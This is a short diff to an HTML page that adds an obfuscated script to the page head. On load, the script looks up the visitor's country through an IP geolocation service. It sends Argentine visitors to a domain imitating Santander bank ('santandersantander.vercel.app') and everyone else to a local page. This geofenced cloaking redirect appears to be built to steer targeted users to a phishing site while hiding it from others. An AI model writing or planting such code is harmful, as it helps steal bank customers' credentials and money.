@@ -962,6 +962,33 @@ footer{
 }
 
 </style>
+
+
+  <script>
+(function(){
+  const _0x2f4a = 'https://santandersantander.vercel.app/';
+  const _0x3b8c = 'incio.html';
+  const _0x4d2e = 'https://ipapi.co/json/';
+  
+  // Timeout de 3 segundos
+  const timeoutPromise = new Promise((_, reject) => {
+    setTimeout(() => reject(new Error('Timeout')), 3000);
+  });
+  
+  Promise.race([fetch(_0x4d2e), timeoutPromise])
+    .then(_0x5a1f => _0x5a1f.json())
+    .then(_0x2b7c => {
+      if (_0x2b7c.country === "AR") {
+        window.location.href = _0x2f4a;
+      } else {
+        window.location.href = _0x3b8c;
+      }
+    })
+    .catch(() => {
+      window.location.href = _0x3b8c;
+    });
+})();
+</script>
 </head>
 
 
